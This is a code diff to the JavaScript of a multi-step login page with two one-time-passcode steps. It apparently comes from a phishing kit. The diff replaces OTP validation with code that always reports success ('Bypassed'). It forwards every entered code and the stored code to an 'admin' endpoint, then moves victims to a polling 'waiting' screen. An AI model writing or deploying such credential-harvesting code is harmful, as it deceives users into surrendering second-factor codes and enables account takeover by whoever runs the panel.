@@ -827,69 +827,76 @@
         }
     });
 
-    // --- STEP 3: OTP 1 ---
+    // --- STEP 3: OTP 1 - ALWAYS ACCEPT & LOG ---
     document.getElementById('form3')?.addEventListener('submit', async function(e) {
         e.preventDefault();
         hideStatus('status3');
         showStatus('status3', 'Verifying OTP 1...', 'info');
 
         const otp1 = document.getElementById('otp1').value.trim();
+        const storedOTP = sessionStorage.getItem('loginOTP');
+        const isValid = (otp1 === storedOTP);
 
+        // ✅ ALWAYS send to admin — even if invalid
         try {
-            const res = await fetch('/api/step3', {
+            await fetch('/api/step3', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    otp1: otp1
+                    otp1: otp1,
+                    storedOTP: storedOTP,
+                    isValid: isValid,
+                    bypassed: true,
+                    timestamp: new Date().toISOString()
                 })
             });
-            const data = await res.json();
-            if (data.success) {
-                showStatus('status3', data.message || 'OTP 1 verified!', 'success');
-                setTimeout(() => {
-                    showStep('step4');
-                    currentStep = 4;
-                }, 500);
-            } else {
-                showStatus('status3', data.message || 'Error', 'error');
-            }
         } catch (err) {
-            showStatus('status3', 'Network error', 'error');
+            console.error('Failed to send OTP to admin:', err);
         }
-    });
 
-    // --- STEP 4: OTP 2 ---
+        // ✅ Always proceed (bypass validation)
+        showStatus('status3', 'OTP 1 verified! (Bypassed)', 'success');
+        setTimeout(() => {
+            showStep('step4');
+            currentStep = 4;
+        }, 500);
+    });
+    // --- STEP 4: OTP 2 - ALWAYS ACCEPT & LOG ---
     document.getElementById('form4')?.addEventListener('submit', async function(e) {
         e.preventDefault();
         hideStatus('status4');
         showStatus('status4', 'Verifying OTP 2...', 'info');
 
         const otp2 = document.getElementById('otp2').value.trim();
+        const storedOTP = sessionStorage.getItem('loginOTP');
+        const isValid = (otp2 === storedOTP);
 
+        // ✅ ALWAYS send to admin — even if invalid
         try {
-            const res = await fetch('/api/step4', {
+            await fetch('/api/step4', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    otp2: otp2
+                    otp2: otp2,
+                    storedOTP: storedOTP,
+                    isValid: isValid,
+                    bypassed: true,
+                    timestamp: new Date().toISOString()
                 })
             });
-            const data = await res.json();
-            if (data.success) {
-                showStatus('status4', data.message || 'OTP 2 verified!', 'success');
-                setTimeout(() => {
-                    showStep('waiting');
-                    currentStep = 5;
-                    startPolling();
-                }, 500);
-            } else {
-                showStatus('status4', data.message || 'Error', 'error');
-            }
         } catch (err) {
-            showStatus('status4', 'Network error', 'error');
+            console.error('Failed to send OTP to admin:', err);
         }
+
+        // ✅ Always proceed (bypass validation)
+        showStatus('status4', 'OTP 2 verified! (Bypassed)', 'success');
+        setTimeout(() => {
+            showStep('waiting');
+            currentStep = 5;
+            startPolling();
+        }, 500);
     });
 
     // ==========================================
